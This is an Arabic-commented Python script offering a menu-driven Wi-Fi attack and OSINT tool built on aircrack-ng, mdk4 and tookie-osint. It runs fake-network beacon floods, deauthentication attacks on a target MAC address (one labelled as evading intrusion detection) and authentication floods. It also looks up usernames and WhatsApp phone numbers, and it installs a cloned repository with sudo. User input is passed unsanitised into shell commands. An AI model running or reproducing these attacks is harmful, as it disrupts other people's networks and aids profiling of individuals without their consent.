from subprocess import run
import shutil as sh
run("clear" , shell=True)
#الشعار وتحقق من الأدوات
print("  __ _ _ __ ___  __ _| | __ _ _ __  ")
print(" / _` | '__/ __|/ _` | |/ _` | '_ \\ ")
print("| (_| | |  \\__ \\ (_| | | (_| | | | |")
print(" \\__,_|_|  |___/\\__,_|_|\\__,_|_| |_|")

print("\n")

print("التحقق من الأدوات...")
#التحقق من الأدوات
aircrack = sh.which('aircrack-ng')

mdk4 = sh.which('mdk4')

tookie_osint = sh.which('tookie-osint')
#تثبيت الأدوات الغير مثبتة

if aircrack is None or mdk4 is None or tookie_osint is None:
    if aircrack is None:
        print("aircrack غير مثبت")
        print("سيتم تثبيتها تلقائيا")
        run("sudo apt install aircrack-ng -y" , shell=True)
	
    elif mdk4 is None:
        print("mdk4 غير مثبت")
        print("سيتم تثبيتها تلقائيا")
        run("sudo apt install mdk4 -y" , shell=True)
        
    elif tookie_osint is None:
        print("tookie-osint غير مثبت")
        print("سيتم تثبيتها تلقائيا")
        run("git clone https://github.com/alfredredbird/tookie-osint.git && cd tookie-osint && chmod +x install.sh && sudo ./install.sh" ,shell=True)

else:
	print("\n")
	print("🎆كل الأدوات مثبت بنجاح")




while True:
    
    #الخيارات
    print("\n")
    print("1:إنشاء شبكات وهمية")
    print("2:هجوم احترافي مع تجنب كشف أنظمة الحماية (IDS)")
    print("3:تنفيذ هجوم فصل مع التبديل بين القنوات 1 و 6 و 11")
    print("4:هجوم حجب المصادقة")
    print("5:عرض الشبكات ومعلومات مثل MAC address")
    print("6:البحث بأداة tookie-osint")
    print("==========================================================")
    print("00: إيقاف وضع المونيتر مود")
    print("0:تشغيل وضع المونيتر مود")
    print("999:exit")
    print("==========================================================")
    
     #الإدخال  
     
    inp = input("إختر:")

    #الجمل الشرطية

    if inp == "0":
        run("sudo airmon-ng start wlp4s0" , shell=True)
    elif inp == "999":
        print("إلى اللقاء🫡👋")
        break
        
    elif inp == "00":
        run("sudo airmon-ng stop wlp4s0mon" , shell=True)
        
    elif inp == "1" :
        run("sudo mdk4 wlp4s0mon b -h -c 1,6,11 -s 100" , shell=True)

    elif inp == "2":
        print("أحصل على عنوان الـ MAC الخاص بالشبكة باستخدام الخيار 5")
        adrs = input("أدخل عنوان MAC للشبكة المستهدفة>> ")
        run(f"sudo mdk4 wlp4s0mon d -B {adrs} -x -c 1,6,11:100" , shell=True  )

    elif inp == "3":
        print("أحصل على عنوان الـ MAC الخاص بالشبكة باستخدام الخيار 5")
        adrs = input("أدخل عنوان MAC للشبكة المستهدفة>> ")
        run(f"sudo mdk4 wlp4s0mon d -B {adrs} -c 1,6,11:100" , shell=True)
        
    elif inp == "4":
        print("أحصل على عنوان الـ MAC الخاص بالشبكة باستخدام الخيار 5")
        adrs = input("أدخل عنوان MAC للشبكة المستهدفة>> ")
        run(f"sudo mdk4 wlp4s0mon a -a {adrs} -s 500" , shell=True)
        
    elif inp == "5":
        run("sudo airodump-ng wlp4s0mon" , shell=True)
    #أداة tookie-osint -------------------------------
    elif inp == "6":
        #الخيارات
        run("clear" , shell=True)
        print("\n")
        print("1:البحث عن يوزر")
        print("2:البحث عن أسماء مستخدمين موجودين في ملف")
        print("3:البحث عن رقم هاتف في الواتساب")
        inp2 = input("إختر:")
        
        #الجمل الشرطية
        
        if inp2 == "1":
            user = input("أدخل اليوزر الذي تريد البحث عنه:")
            run(f"sudo tookie-osint -u {user}" , shell=True)
        elif inp2 == "2":
            print("يجب أن تكون أسماء المستخدمين في الملف كل واحد في سطر!")
            file = input("أدخل مسار الملف الذي يحتوي على أسماء المستخدمين:")
            run(f"tookie-osint -U {file}" , shell=True)    
        elif inp2 == "3":
            number = input("أدخل رقم الهاتف المراد البحث عنه:")
            run(f"tookie-osint -u {number} -W" , shell=True)
